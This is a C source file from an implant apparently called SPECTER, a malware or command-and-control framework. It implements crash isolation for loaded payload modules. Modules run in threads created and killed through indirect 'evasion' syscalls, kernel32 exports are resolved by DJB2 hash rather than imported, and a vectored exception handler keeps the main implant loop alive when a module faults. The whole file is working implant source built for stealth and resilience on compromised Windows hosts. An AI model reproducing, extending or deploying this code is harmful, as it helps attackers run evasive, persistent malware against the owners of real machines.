/**
 * SPECTER Implant — Guardian Threads & Crash Isolation
 *
 * Each loaded module runs inside a "guardian" thread.  A Vectored
 * Exception Handler (VEH) catches fatal exceptions
 * (EXCEPTION_ACCESS_VIOLATION, EXCEPTION_STACK_OVERFLOW, etc.) from
 * module code and marks the module CRASHED without bringing down the
 * main implant loop.
 *
 * Flow:
 *   guardian_create  → register VEH → create thread suspended
 *                    → store in guardian slot → resume thread
 *   VEH handler     → on fatal exception in a guardian thread
 *                    → set module CRASHED → terminate that thread
 *   guardian_wait    → NtWaitForSingleObject with timeout
 *   guardian_kill    → NtTerminateThread + set CRASHED
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "bus.h"
#include "peb.h"

/* ------------------------------------------------------------------ */
/*  Static guardian context                                             */
/* ------------------------------------------------------------------ */

static GUARDIAN_CONTEXT g_guardian_ctx;

/* ------------------------------------------------------------------ */
/*  DJB2 hashes for VEH registration                                   */
/* ------------------------------------------------------------------ */

#ifndef TEST_BUILD
#define HASH_ADDVECTOREDEXCEPTIONHANDLER    0xAA100957
#define HASH_REMOVEVECTOREDEXCEPTIONHANDLER 0xFED69FFC

typedef PVOID (__attribute__((ms_abi)) *fn_AddVectoredExceptionHandler)(
    ULONG First, PVOID Handler);
typedef ULONG (__attribute__((ms_abi)) *fn_RemoveVectoredExceptionHandler)(
    PVOID Handle);
#endif

/* ------------------------------------------------------------------ */
/*  Helper: find the guardian slot for a given module                   */
/* ------------------------------------------------------------------ */

static GUARDIAN_SLOT *find_slot_by_module(LOADED_MODULE *mod) {
    if (!mod)
        return NULL;
    for (DWORD i = 0; i < GUARDIAN_MAX_MODULES; i++) {
        if (g_guardian_ctx.slots[i].active &&
            g_guardian_ctx.slots[i].module == mod)
            return &g_guardian_ctx.slots[i];
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Helper: allocate a free guardian slot                               */
/* ------------------------------------------------------------------ */

static GUARDIAN_SLOT *alloc_slot(void) {
    if (g_guardian_ctx.active_count >= GUARDIAN_MAX_MODULES)
        return NULL;
    for (DWORD i = 0; i < GUARDIAN_MAX_MODULES; i++) {
        if (!g_guardian_ctx.slots[i].active)
            return &g_guardian_ctx.slots[i];
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Helper: release a guardian slot                                     */
/* ------------------------------------------------------------------ */

static void release_slot(GUARDIAN_SLOT *slot) {
    if (!slot)
        return;
    slot->active = FALSE;
    slot->module = NULL;
    slot->thread = NULL;
    if (g_guardian_ctx.active_count > 0)
        g_guardian_ctx.active_count--;
}

/* ------------------------------------------------------------------ */
/*  Helper: check if an exception is a fatal module crash               */
/* ------------------------------------------------------------------ */

static BOOL is_fatal_exception(DWORD code) {
    switch (code) {
    case EXCEPTION_ACCESS_VIOLATION:
    case EXCEPTION_STACK_OVERFLOW:
    case EXCEPTION_INT_DIVIDE_BY_ZERO:
    case EXCEPTION_PRIV_INSTRUCTION:
    case EXCEPTION_ILLEGAL_INSTRUCTION:
    case EXCEPTION_NONCONTINUABLE_EXCEPTION:
        return TRUE;
    default:
        return FALSE;
    }
}

/* ------------------------------------------------------------------ */
/*  Helper: check if an address falls within a module's memory region   */
/* ------------------------------------------------------------------ */

static LOADED_MODULE *find_module_for_address(PVOID addr) {
    for (DWORD i = 0; i < GUARDIAN_MAX_MODULES; i++) {
        GUARDIAN_SLOT *slot = &g_guardian_ctx.slots[i];
        if (!slot->active || !slot->module)
            continue;

        LOADED_MODULE *mod = slot->module;
        ULONG_PTR base = (ULONG_PTR)mod->memory_base;
        ULONG_PTR end  = base + mod->memory_size;
        ULONG_PTR fault = (ULONG_PTR)addr;

        if (fault >= base && fault < end)
            return mod;
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  VEH handler — catch fatal exceptions from guardian threads          */
/* ------------------------------------------------------------------ */

#ifndef TEST_BUILD
/**
 * Vectored Exception Handler for guardian thread crash isolation.
 *
 * When a module triggers a fatal exception (access violation, stack
 * overflow, etc.), this handler:
 *   1. Identifies which module caused the fault (by exception address)
 *   2. Marks the module as CRASHED
 *   3. Terminates the guardian thread
 *   4. Returns EXCEPTION_CONTINUE_SEARCH to let the thread die
 *
 * The main implant loop is unaffected.
 */
static LONG __attribute__((ms_abi)) guardian_veh_handler(
    PEXCEPTION_POINTERS info)
{
    if (!info || !info->ExceptionRecord)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD code = info->ExceptionRecord->ExceptionCode;

    /* Only handle fatal exceptions */
    if (!is_fatal_exception(code))
        return EXCEPTION_CONTINUE_SEARCH;

    /* Check if the faulting address is within a loaded module */
    PVOID fault_addr = info->ExceptionRecord->ExceptionAddress;
    LOADED_MODULE *mod = find_module_for_address(fault_addr);

    if (!mod)
        return EXCEPTION_CONTINUE_SEARCH;  /* Not our module */

    /* Mark the module as crashed */
    mod->status = MODULE_STATUS_CRASHED;

    /* Write crash info to the module's output ring if available */
    if (mod->output_ring && mod->bus_api) {
        /* Simple crash marker: "[CRASH] Exception 0xXXXXXXXX" */
        BYTE crash_msg[64];
        const char *prefix = "[CRASH] Exception 0x";
        DWORD prefix_len = 0;
        while (prefix[prefix_len]) prefix_len++;
        spec_memcpy(crash_msg, prefix, prefix_len);

        /* Convert exception code to hex */
        DWORD val = code;
        for (int i = 7; i >= 0; i--) {
            DWORD nibble = (val >> (i * 4)) & 0xF;
            crash_msg[prefix_len + (7 - i)] =
                (BYTE)(nibble < 10 ? '0' + nibble : 'A' + nibble - 10);
        }
        DWORD total_len = prefix_len + 8;

        output_write(mod->output_ring, crash_msg, total_len, OUTPUT_ERROR);
    }

    /* Find and release the guardian slot */
    GUARDIAN_SLOT *slot = find_slot_by_module(mod);
    if (slot) {
        /* Terminate the guardian thread via NtTerminateThread */
        IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_guardian_ctx.implant_ctx;
        if (ctx && ctx->evasion_ctx) {
            evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
                HASH_NTTERMINATETHREAD,
                slot->thread, (NTSTATUS)STATUS_UNSUCCESSFUL);
        }
        /* Close the thread handle */
        if (ctx && ctx->evasion_ctx) {
            evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
                HASH_NTCLOSE, slot->thread);
        }
        release_slot(slot);
    }

    /* Don't continue execution — let the thread terminate */
    return EXCEPTION_CONTINUE_SEARCH;
}
#endif /* !TEST_BUILD */

/* ------------------------------------------------------------------ */
/*  Guardian thread wrapper — calls module entry, sets COMPLETED       */
/* ------------------------------------------------------------------ */

/**
 * Parameters passed to the guardian thread wrapper.
 * Stored in a stack-local struct before thread creation.
 */
typedef struct _GUARDIAN_THREAD_PARAM {
    PVOID           entry_point;    /* Module entry function             */
    MODULE_BUS_API *bus_api;        /* Bus API table for the module      */
    LOADED_MODULE  *module;         /* Back-pointer to loaded module     */
} GUARDIAN_THREAD_PARAM;

/* Static storage for thread parameters (one per slot) */
static GUARDIAN_THREAD_PARAM g_thread_params[GUARDIAN_MAX_MODULES];

#ifndef TEST_BUILD
/**
 * Guardian thread entry point.  Wraps the actual module entry so we
 * can mark the module COMPLETED on normal return.
 */
static DWORD __attribute__((ms_abi)) guardian_thread_entry(PVOID param) {
    GUARDIAN_THREAD_PARAM *gp = (GUARDIAN_THREAD_PARAM *)param;
    if (!gp || !gp->entry_point || !gp->bus_api || !gp->module)
        return 1;

    /* Mark module as running */
    gp->module->status = MODULE_STATUS_RUNNING;

    /* Call the module entry point */
    PIC_ENTRY_FN entry = (PIC_ENTRY_FN)gp->entry_point;
    DWORD result = entry(gp->bus_api, NULL, 0);

    /* Module returned normally — mark completed */
    if (gp->module->status == MODULE_STATUS_RUNNING)
        gp->module->status = MODULE_STATUS_COMPLETED;

    (void)result;
    return 0;
}
#endif

/* ------------------------------------------------------------------ */
/*  guardian_init                                                       */
/* ------------------------------------------------------------------ */

NTSTATUS guardian_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    spec_memset(&g_guardian_ctx, 0, sizeof(GUARDIAN_CONTEXT));
    spec_memset(g_thread_params, 0, sizeof(g_thread_params));
    g_guardian_ctx.implant_ctx = ctx;
    g_guardian_ctx.initialized = TRUE;

#ifndef TEST_BUILD
    /* Register the VEH handler (first handler in the chain) */
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (k32) {
        fn_AddVectoredExceptionHandler add_veh =
            (fn_AddVectoredExceptionHandler)find_export_by_hash(
                k32, HASH_ADDVECTOREDEXCEPTIONHANDLER);
        if (add_veh) {
            g_guardian_ctx.veh_handle =
                add_veh(1, (PVOID)guardian_veh_handler);
        }
    }
#endif

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  guardian_create                                                     */
/* ------------------------------------------------------------------ */

BOOL guardian_create(PVOID entry_point, PVOID param, LOADED_MODULE *mod) {
    if (!entry_point || !mod)
        return FALSE;

    if (!g_guardian_ctx.initialized)
        return FALSE;

    /* Allocate a guardian slot */
    GUARDIAN_SLOT *slot = alloc_slot();
    if (!slot)
        return FALSE;

    /* Find the slot index for thread param storage */
    DWORD slot_idx = (DWORD)(slot - g_guardian_ctx.slots);

    /* Set up thread parameters */
    GUARDIAN_THREAD_PARAM *gp = &g_thread_params[slot_idx];
    gp->entry_point = entry_point;
    gp->bus_api = (MODULE_BUS_API *)param;
    gp->module = mod;

    mod->status = MODULE_STATUS_LOADING;

#ifndef TEST_BUILD
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_guardian_ctx.implant_ctx;
    if (!ctx || !ctx->evasion_ctx) {
        return FALSE;
    }

    /* Create the guardian thread in suspended state via NtCreateThreadEx */
    HANDLE thread = NULL;
    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTCREATETHREADEX,
        &thread,
        (ULONG)0x1FFFFF,       /* THREAD_ALL_ACCESS */
        NULL,                   /* OBJECT_ATTRIBUTES */
        (HANDLE)-1,             /* NtCurrentProcess  */
        (PVOID)guardian_thread_entry,
        (PVOID)gp,
        (ULONG)0x00000001,     /* CREATE_SUSPENDED  */
        (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);

    if (!NT_SUCCESS(status))
        return FALSE;

    /* Store in slot */
    slot->thread = thread;
    slot->module = mod;
    slot->active = TRUE;
    g_guardian_ctx.active_count++;

    /* Store guardian thread handle in the loaded module */
    mod->guardian_thread = thread;

    /* Resume the thread via NtResumeThread */
    ULONG suspend_count = 0;
    evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTRESUMETHREAD, thread, &suspend_count);

#else
    /* TEST_BUILD: no actual thread creation — store slot for testing */
    slot->thread = (HANDLE)(ULONG_PTR)0xDEAD0001;
    slot->module = mod;
    slot->active = TRUE;
    g_guardian_ctx.active_count++;
    mod->guardian_thread = slot->thread;
    mod->status = MODULE_STATUS_RUNNING;
#endif

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  guardian_wait                                                       */
/* ------------------------------------------------------------------ */

BOOL guardian_wait(LOADED_MODULE *mod, DWORD timeout_ms) {
    if (!mod)
        return FALSE;

    /* If already completed or crashed, return immediately */
    if (mod->status == MODULE_STATUS_COMPLETED ||
        mod->status == MODULE_STATUS_CRASHED ||
        mod->status == MODULE_STATUS_WIPED)
        return TRUE;

    GUARDIAN_SLOT *slot = find_slot_by_module(mod);
    if (!slot)
        return FALSE;

#ifndef TEST_BUILD
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_guardian_ctx.implant_ctx;
    if (!ctx || !ctx->evasion_ctx)
        return FALSE;

    /* Convert timeout to 100ns intervals (negative = relative) */
    LARGE_INTEGER wait_time;
    if (timeout_ms == 0) {
        /* Immediate check — zero timeout */
        wait_time.QuadPart = 0;
    } else {
        wait_time.QuadPart = -((long long)timeout_ms * 10000);
    }

    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTWAITFORSINGLEOBJECT,
        slot->thread, (ULONG)FALSE, &wait_time);

    if (NT_SUCCESS(status)) {
        /* Thread exited — if not already crashed, mark completed */
        if (mod->status == MODULE_STATUS_RUNNING)
            mod->status = MODULE_STATUS_COMPLETED;

        /* Close the thread handle */
        evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
            HASH_NTCLOSE, slot->thread);
        release_slot(slot);
        return TRUE;
    }

    /* STATUS_TIMEOUT or error — still running */
    return FALSE;
#else
    /* TEST_BUILD: simulate wait based on current module status */
    if (mod->status == MODULE_STATUS_RUNNING) {
        /* In test mode, the caller sets status manually */
        return FALSE;
    }
    release_slot(slot);
    return TRUE;
#endif
}

/* ------------------------------------------------------------------ */
/*  guardian_kill                                                       */
/* ------------------------------------------------------------------ */

BOOL guardian_kill(LOADED_MODULE *mod) {
    if (!mod)
        return FALSE;

    GUARDIAN_SLOT *slot = find_slot_by_module(mod);
    if (!slot)
        return FALSE;

#ifndef TEST_BUILD
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_guardian_ctx.implant_ctx;
    if (!ctx || !ctx->evasion_ctx) {
        release_slot(slot);
        return FALSE;
    }

    /* Terminate the thread */
    evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTTERMINATETHREAD,
        slot->thread, (NTSTATUS)STATUS_UNSUCCESSFUL);

    /* Close the thread handle */
    evasion_syscall((EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTCLOSE, slot->thread);
#endif

    /* Mark as crashed */
    mod->status = MODULE_STATUS_CRASHED;
    release_slot(slot);

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  guardian_shutdown                                                   */
/* ------------------------------------------------------------------ */

void guardian_shutdown(void) {
    if (!g_guardian_ctx.initialized)
        return;

    /* Kill any still-active guardian threads */
    for (DWORD i = 0; i < GUARDIAN_MAX_MODULES; i++) {
        if (g_guardian_ctx.slots[i].active && g_guardian_ctx.slots[i].module) {
            guardian_kill(g_guardian_ctx.slots[i].module);
        }
    }

#ifndef TEST_BUILD
    /* Remove the VEH handler */
    if (g_guardian_ctx.veh_handle) {
        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
        if (k32) {
            fn_RemoveVectoredExceptionHandler remove_veh =
                (fn_RemoveVectoredExceptionHandler)find_export_by_hash(
                    k32, HASH_REMOVEVECTOREDEXCEPTIONHANDLER);
            if (remove_veh) {
                remove_veh(g_guardian_ctx.veh_handle);
            }
        }
        g_guardian_ctx.veh_handle = NULL;
    }
#endif

    g_guardian_ctx.initialized = FALSE;
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
/**
 * Get the guardian context for testing.
 */
GUARDIAN_CONTEXT *guardian_test_get_context(void) {
    return &g_guardian_ctx;
}

/**
 * Simulate a module crash for testing.
 * Sets module status to CRASHED and releases the guardian slot.
 */
void guardian_test_simulate_crash(LOADED_MODULE *mod) {
    if (!mod)
        return;
    mod->status = MODULE_STATUS_CRASHED;
    GUARDIAN_SLOT *slot = find_slot_by_module(mod);
    if (slot)
        release_slot(slot);
}

/**
 * Simulate module completion for testing.
 */
void guardian_test_simulate_complete(LOADED_MODULE *mod) {
    if (!mod)
        return;
    mod->status = MODULE_STATUS_COMPLETED;
    GUARDIAN_SLOT *slot = find_slot_by_module(mod);
    if (slot)
        release_slot(slot);
}
#endif
